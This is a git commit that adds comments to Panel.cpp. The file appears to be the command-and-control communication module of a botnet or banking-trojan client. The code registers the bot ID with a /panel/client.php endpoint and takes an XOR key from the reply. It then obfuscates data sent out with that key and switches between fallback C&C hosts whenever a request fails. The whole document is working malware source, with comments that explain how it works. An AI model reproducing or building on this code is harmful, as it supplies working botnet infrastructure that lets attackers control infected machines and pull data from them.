8fd6b8ce0e370c1b7dbe480bdeb5dd1fef53696d
srbgd <20709558+srbgd@users.noreply.github.com>
2018-06-17 14:49:24 +0300

    Panel.cpp commented

--- Panel.cpp
+++ Panel.cpp
@@ -27,47 +27,58 @@ void InitPanelRequest()
 
 char *PanelRequest(char *data, int *outputSize)
 {
+   // if it is the first request (the client dosen't have the encryption key)
    if(!gKey)
    {
       EnterCriticalSection(&gInitCritSec);
       Funcs::pInitializeCriticalSection(&gSwitchCritSec);
       char request[32] = { 0 };
+      // write ping command in request body
       Funcs::pLstrcpyA(request, Strs::pingRequest);
 
       GetBotId(gBotId);
 
+      // /panel/client.php? botid
       Funcs::pLstrcpyA(gPath, PATH);
       Funcs::pLstrcatA(gPath, "?");
       Funcs::pLstrcatA(gPath, gBotId);
 
+      // init request structure
       gRequest.host            = HOST[gHostIndex];
       gRequest.port            = PORT;
       gRequest.path            = gPath;
       gRequest.post            = TRUE;
 
+      // while can't recieve data try next C&C address
       while(!HttpSubmitRequest(gRequest))
       {
          SwitchHost();
          gRequest.host = HOST[gHostIndex];
       }
+      // save recived key
       gKey = (char *) gRequest.outputBody;
       LeaveCriticalSection(&gInitCritSec); //useless
    }
+   // init request structure (gRequest was initialized earlier)
    HttpRequestData request;
    Funcs::pMemcpy(&request, &gRequest, sizeof(gRequest));
 
    request.inputBody     = (BYTE *) data;
    request.inputBodySize = Funcs::pLstrlenA(data);
 
+   // encrypt sended data
    Obfuscate(request.inputBody, request.inputBodySize, gKey);
 
+   // while can't recieve a response switch C&C address
    while(!HttpSubmitRequest(request))
    {
       SwitchHost();
       request.host  = HOST[gHostIndex];
       gRequest.host = HOST[gHostIndex];
    }
+   // decrypt recived data (encryption and decryption keys are the same because it uses a symmetric encryption algorithm (ordinary xor))
    Obfuscate(request.outputBody, request.outputBodySize, gKey);
+   // return recived data
    if(outputSize)
       *outputSize = request.outputBodySize;
    return (char *) request.outputBody;
